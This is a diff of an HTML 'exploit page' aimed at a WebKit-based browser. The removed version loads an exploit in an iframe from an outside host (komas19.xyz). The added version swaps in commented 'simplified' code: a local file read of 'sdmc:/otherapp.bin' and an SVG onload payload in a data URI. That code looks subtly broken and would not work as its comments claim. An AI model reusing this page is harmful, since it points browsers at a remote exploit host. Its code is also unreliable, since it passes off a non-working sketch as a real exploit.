@@ -1,20 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Webkit Remote Code Execution Vulnerability</title>
+  <title>Exploit Page</title>
+</head>
+<body>
+  <h1>Exploit Page</h1>
+  <p>This page is vulnerable to an arbitrary code execution exploit.</p>
   <script>
-    // Exploit code
     function exploit() {
-      var iframe = document.createElement('iframe');
-      iframe.src = 'https://komas19.xyz/exploit.html';
-      document.body.appendChild(iframe);
+      // This is a simplified example of an exploit that could potentially lead to arbitrary file read
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', 'sdmc:/otherapp.bin', false); 
+      xhr.send();
+      alert('File contents: ' + xhr.responseText);
+    }
+    // Exploit code
+    function executeExploit() {
+      // This is a simplified example of an exploit that could potentially lead to arbitrary code execution
+      var payload = "exploit()";
+      // Vulnerability in the rendering engine allows the payload to be executed
+      var img = new Image();
+      img.src = 'data:image/svg+xml;base64,' + btoa('<svg/onload="' + payload + '">');
     }
     
     // Triggering the exploit
-    exploit();
+    executeExploit();
   </script>
-</head>
-<body>
-  <img id="image" src="non_existent_image.jpg" alt="Example Image">
 </body>
 </html>
